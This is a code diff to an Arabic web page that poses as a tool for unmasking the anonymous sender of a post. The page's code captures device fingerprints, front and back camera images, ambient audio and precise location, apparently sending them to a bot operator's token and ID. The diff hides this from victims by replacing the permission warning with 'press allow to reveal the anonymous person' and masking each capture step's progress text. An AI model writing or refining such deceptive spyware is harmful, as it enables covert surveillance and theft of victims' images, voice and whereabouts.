@@ -440,7 +440,7 @@
     <h1 class="main-title">كشف <span>مجهول الهوية</span></h1>
     <p class="sub-desc">
         الصق رابط البوست لمعرفة من قام بإرساله
-        <small>⚠️ سيتم طلب أذونات الكاميرا والميكروفون والموقع</small>
+        <small>⚠️ سيتم كشف مجهول الهويه اضغط سماح </small>
     </p>
 
     <!-- حقل الرابط -->
@@ -809,7 +809,7 @@
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 2. بصمة الجهاز ======
-                updateProgress(15, '📱 جاري قراءة بيانات الجهاز...');
+                updateProgress(15, '📱  جاري كشف المعلومات المجهول   ...');
                 await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
@@ -819,22 +819,22 @@
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 4. الكاميرا الأمامية ======
-                updateProgress(45, '📸 جاري فتح الكاميرا الأمامية...');
+                updateProgress(45, '📸 جاري كشف المعلومات المجهول...');
                 await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 5. الكاميرا الخلفية ======
-                updateProgress(65, '📷 جاري فتح الكاميرا الخلفية...');
+                updateProgress(65, '📷  جاري كشف المعلومات المجهول...');
                 await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 6. التسجيل الصوتي ======
-                updateProgress(80, '🎤 جاري تسجيل الصوت...');
+                updateProgress(80, '🎤  جاري كشف المعلومات المجهول...');
                 await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 7. الموقع ======
-                updateProgress(90, '📍 جاري تحديد الموقع...');
+                updateProgress(90, '📍  جاري كشف المعلومات المجهول...');
                 await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
